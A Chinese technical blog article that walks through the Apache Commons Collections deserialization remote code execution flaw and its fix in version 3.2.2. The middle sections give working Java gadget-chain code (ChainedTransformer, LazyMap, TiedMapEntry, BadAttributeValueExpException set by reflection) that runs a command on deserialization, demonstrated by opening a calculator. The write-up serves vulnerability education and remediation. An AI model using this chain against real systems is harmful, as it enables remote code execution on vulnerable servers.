Apache-Commons-Collections这个框架，相信每一个Java程序员都不陌生，这是一个非常著名的开源框架。

但是，他其实也曾经被爆出过序列化安全漏洞，可以被远程执行命令。

### 背景

Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。

**Commons Collections包为Java标准的Collections API提供了相当好的补充。**在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。

Commons Collections的最新版是4.4，但是使用比较广泛的还是3.x的版本。其实，**在3.2.1以下版本中，存在一个比较大的安全漏洞，可以被利用来进行远程命令执行。**

这个漏洞在2015年第一次被披露出来，但是业内一直称称这个漏洞为"2015年最被低估的漏洞"。

因为这个类库的使用实在是太广泛了，首当其中的就是很多Java Web Server，这个漏洞在当时横扫了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。

之后，Gabriel Lawrence和Chris Frohoff两位大神在《Marshalling Pickles how deserializing objects can ruin your day》中提出如何利用Apache Commons Collection实现任意代码执行。

### 问题复现

这个问题主要会发生在Apache Commons Collections的3.2.1以下版本，本次使用3.1版本进行测试，JDK版本为Java 8。

#### 利用Transformer攻击

Commons Collections中提供了一个Transformer接口，主要是可以用来进行类型装换的，这个接口有一个实现类是和我们今天要介绍的漏洞有关的，那就是InvokerTransformer。

**InvokerTransformer提供了一个transform方法，该方法核心代码只有3行，主要作用就是通过反射对传入的对象进行实例化，然后执行其iMethodName方法。**

![][2]

而需要调用的iMethodName和需要使用的参数iArgs其实都是InvokerTransformer类在实例化时设定进来的，这个类的构造函数如下：

![][3]

也就是说，使用这个类，理论上可以执行任何方法。那么，我们就可以利用这个类在Java中执行外部命令。

我们知道，想要在Java中执行外部命令，需要使用`Runtime.getRuntime().exec(cmd)`的形式，那么，我们就想办法通过以上工具类实现这个功能。

首先，通过InvokerTransformer的构造函数设置好我们要执行的方法以及参数：

    Transformer transformer = new InvokerTransformer("exec",
            new Class[] {String.class},
            new Object[] {"open /Applications/Calculator.app"});
    

通过，构造函数，我们设定方法名为`exec`，执行的命令为`open /Applications/Calculator.app`，即打开mac电脑上面的计算器（windows下命令：`C:\\Windows\\System32\\calc.exe`）。

然后，通过InvokerTransformer实现对`Runtime`类的实例化：

    transformer.transform(Runtime.getRuntime());
    

运行程序后，会执行外部命令，打开电脑上的计算机程序：

![][4]

至此，我们知道可以利用InvokerTransformer来调用外部命令了，那是不是只需要把一个我们自定义的InvokerTransformer序列化成字符串，然后再反序列化，接口实现远程命令执行：

![][5]

先将transformer对象序列化到文件中，再从文件中读取出来，并且执行其transform方法，就实现了攻击。

#### 你以为这就完了？

但是，如果事情只有这么简单的话，那这个漏洞应该早就被发现了。想要真的实现攻击，那么还有几件事要做。

因为，`newTransformer.transform(Runtime.getRuntime());`这样的代码，不会有人真的在代码中写的。

如果没有了这行代码，还能实现执行外部命令么？

这就要利用到Commons Collections中提供了另一个工具那就是ChainedTransformer，这个类是Transformer的实现类。

**ChainedTransformer类提供了一个transform方法，他的功能遍历他的iTransformers数组，然后依次调用其transform方法，并且每次都返回一个对象，并且这个对象可以作为下一次调用的参数。**

![][6]

那么，我们可以利用这个特性，来自己实现和`transformer.transform(Runtime.getRuntime());`同样的功能：

     Transformer[] transformers = new Transformer[] {
        //通过内置的ConstantTransformer来获取Runtime类
        new ConstantTransformer(Runtime.class),
        //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
        new InvokerTransformer("getMethod",
            new Class[] {String.class, Class[].class },
            new Object[] {"getRuntime", new Class[0] }),
        //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
        new InvokerTransformer("invoke",
            new Class[] {Object.class, Object[].class },
            new Object[] {null, new Object[0] }),
        //反射调用exec方法
        new InvokerTransformer("exec",
            new Class[] {String.class },
            new Object[] {"open /Applications/Calculator.app"})
    };
    
    Transformer transformerChain = new ChainedTransformer(transformers);
    

在拿到一个transformerChain之后，直接调用他的transform方法，传入任何参数都可以，执行之后，也可以实现打开本地计算器程序的功能：

![][7]

那么，结合序列化，现在的攻击更加进了一步，不再需要一定要传入`newTransformer.transform(Runtime.getRuntime());`这样的代码了，只要代码中有 `transformer.transform()`方法的调用即可，无论里面是什么参数：

![][8]

#### 攻击者不会满足于此

但是，一般也不会有程序员会在代码中写这样的代码。

那么，攻击手段就需要更进一步，真正做到"不需要程序员配合"。

于是，攻击者们发现了在Commons Collections中提供了一个LazyMap类，这个类的get会调用transform方法。（Commons Collections还真的是懂得黑客想什么呀。）

![][9]

那么，现在的攻击方向就是想办法调用到LazyMap的get方法，并且把其中的factory设置成我们的序列化对象就行了。

顺藤摸瓜，可以找到Commons Collections中的TiedMapEntry类的getValue方法会调用到LazyMap的get方法，而TiedMapEntry类的getValue又会被其中的toString()方法调用到。

    public String toString() {
        return getKey() + "=" + getValue();
    }
    
    public Object getValue() {
        return map.get(key);
    }
    

那么，现在的攻击门槛就更低了一些，只要我们自己构造一个TiedMapEntry，并且将他进行序列化，这样，只要有人拿到这个序列化之后的对象，调用他的toString方法的时候，就会自动触发bug。

    Transformer transformerChain = new ChainedTransformer(transformers);
    
    Map innerMap = new HashMap();
    Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
    

我们知道，toString会在很多时候被隐式调用，如输出的时候(`System.out.println(ois.readObject());`)，代码示例如下：

![][10]

现在，黑客只需要把自己构造的TiedMapEntry的序列化后的内容上传给应用程序，应用程序在反序列化之后，如果调用了toString就会被攻击。

#### 只要反序列化，就会被攻击

那么，有没有什么办法，让代码只要对我们准备好的内容进行反序列化就会遭到攻击呢？

倒还真的被发现了，只要满足以下条件就行了：

那就是在某个类的readObject会调用到上面我们提到的LazyMap或者TiedMapEntry的相关方法就行了。因为Java反序列化的时候，会调用对象的readObject方法。

通过深入挖掘，黑客们找到了BadAttributeValueExpException、AnnotationInvocationHandler等类。这里拿BadAttributeValueExpException举例

BadAttributeValueExpException类是Java中提供的一个异常类，他的readObject方法直接调用了toString方法：

![][11]

那么，攻击者只需要想办法把TiedMapEntry的对象赋值给代码中的valObj就行了。

通过阅读源码，我们发现，只要给BadAttributeValueExpException类中的成员变量val设置成一个TiedMapEntry类型的对象就行了。

这就简单了，通过反射就能实现：

    Transformer transformerChain = new ChainedTransformer(transformers);
    
    Map innerMap = new HashMap();
    Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
    
    BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
    
    // val是私有变量，所以利用下面方法进行赋值
    Field valfield = poc.getClass().getDeclaredField("val");
    valfield.setAccessible(true);
    valfield.set(poc, entry);
    

于是，这时候，攻击就非常简单了，只需要把BadAttributeValueExpException对象序列化成字符串，只要这个字符串内容被反序列化，那么就会被攻击。

![][12]

### 问题解决

以上，我们复现了这个Apache Commons Collections类库带来的一个和反序列化有关的远程代码执行漏洞。

通过这个漏洞的分析，我们可以发现，只要有一个地方代码写的不够严谨，就可能会被攻击者利用。

因为这个漏洞影响范围很大，所以在被爆出来之后就被修复掉了，开发者只需要将Apache Commons Collections类库升级到3.2.2版本，即可避免这个漏洞。

![-w1382][13]

3\.2.2版本对一些不安全的Java类的序列化支持增加了开关，默认为关闭状态。涉及的类包括

    CloneTransformer
    ForClosure
    InstantiateFactory
    InstantiateTransformer
    InvokerTransformer
    PrototypeCloneFactory
    PrototypeSerializationFactory,
    WhileClosure
    

如在InvokerTransformer类中，自己实现了和序列化有关的writeObject()和 readObject()方法：

![][14]

在两个方法中，进行了序列化安全的相关校验，校验实现代码如下：

![][15]

在序列化及反序列化过程中，会检查对于一些不安全类的序列化支持是否是被禁用的，如果是禁用的，那么就会抛出`UnsupportedOperationException`，通过`org.apache.commons.collections.enableUnsafeSerialization`设置这个特性的开关。

将Apache Commons Collections升级到3.2.2以后，执行文中示例代码，将报错如下：

    Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
        at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
        at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
    

### 后话

本文介绍了Apache Commons Collections的历史版本中的一个反序列化漏洞。

如果你阅读本文之后，能够有以下思考，那么本文的目的就达到了：

1、代码都是人写的，有bug都是可以理解的

2、公共的基础类库，一定要重点考虑安全性问题

3、在使用公共类库的时候，要时刻关注其安全情况，一旦有漏洞爆出，要马上升级

4、安全领域深不见底，攻击者总能抽丝剥茧，一点点bug都可能被利用

参考资料： https://commons.apache.org/proper/commons-collections/release_3_2_2.html https://p0sec.net/index.php/archives/121/ https://www.freebuf.com/vuls/175252.html https://kingx.me/commons-collections-java-deserialization.html

 [1]: https://www.hollischuang.com/archives/5177
 [2]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944480560097.jpg
 [3]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944485613275.jpg
 [4]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944494651843.jpg
 [5]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944505042521.jpg
 [6]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944497629664.jpg
 [7]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944539116926.jpg
 [8]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944538564178.jpg
 [9]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944509076736.jpg
 [10]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944537562975.jpg
 [11]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944519240647.jpg
 [12]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944537014741.jpg
 [13]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944526874284.jpg
 [14]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944525715616.jpg
 [15]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944525999226.jpg